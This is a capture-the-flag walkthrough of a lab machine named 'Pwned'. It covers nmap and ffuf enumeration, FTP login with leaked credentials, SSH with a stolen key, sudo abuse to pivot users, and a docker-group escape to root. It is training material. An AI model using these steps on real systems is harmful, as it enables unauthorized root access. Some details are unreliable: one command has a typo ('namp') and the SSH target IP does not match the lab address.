**Lab enviroment**

Kali: **10.0.2.21**

Pwned: **10.0.2.22**

## 1. INFORMATION GATHERING
### a. Check IP Kali
`ip a | grep /24`

![ip address](/images/ip_address.png)
### b. Netdiscover
`sudo netdiscover -r 10.0.2.0/24`

![netdiscover](/images/netdiscover.jpg)
### c. Nmap Target Ports
`sudo namp -sS 10.0.2.22`

![nmap target ports](/images/nmap_target_port.jpg)
### d. Nmap Target Services
`sudo nmap -sS -p 21,22,80 -A 10.0.2.22`

![nmap target services](/images/nmap_target_host.jpg)

## 2. ENUMERATION HTTP (PORT 80/tcp)
### a. Firefox
![enumeration_port_80](/images/enumeration_port_80.jpg)

### b. View Source

![view_source](/images/view_sources.jpg)

### c. Enumeration with ffuf
Can try enum urls with ffuf

`ffuf -u http://10.0.2.22/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

![enu_ffuf](/images/enu_ffuf.jpg)

Find 2 urls and try it

![nothing_html](/images/nothing_html.jpg)

Should pay attention to hidden_text link

![secret_dict](/images/secret_dict.jpg)

Save this list in a txt file

`vi secret_dic.txt`

![secret_dict_txt](/images/secret_dict_txt.jpg)

Try to enumerate again with ffuf using secret_dict list.

`ffuf -u http://10.0.2.22/FUZZ -w secret_dic.txt`

![enu_ffuf_secret](/images/enu_ffuf_secret.jpg)

Found a new URL

![pwned_vuln](/images/pwned_vuln.jpg)

And view source, credential log on ftp is show.

![nmap target services](/images/credential_ftp.jpg)

## 4. EXPLOITATION FTP (PORT 21/tcp)

Log on to ftp server

`ftp ftpuser@10.0.2.22`

![ncrack](/images/ftp_1.jpg)

Go to the shared folder and download files with get command to note.txt and id_rsa file.

`get note.txt`

`get id_rsa`

![ncrack](/images/ftp_get_file.jpg)

Read note.txt

![ncrack](/images/note_txt.jpg)

Try to connect via ssh by ariana

`sudo chmod 600 id_rsa`

`ssh -i id_rsa ariana@192.168.5.59`

![ncrack](/images/ariana_ssh.jpg)

And get the first flag user1.txt

![ncrack](/images/user1_txt.jpg)

We see that ariana can execute /home/messenger.sh file as selena user without password, so we can leverage to execute commands in name of selena.

![ncrack](/images/sudo.jpg)

`sudo -u selena ./messenger.sh`

Have the second flag, user2.txt

![ncrack](/images/user2_txt.jpg)

And can run id and see that selena is a member of the group docker.

![ncrack](/images/docker.jpg)

We can take advantage of this

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

Now we are root and can read root.txt in the root folder.

![ncrack](/images/root_txt.jpg)



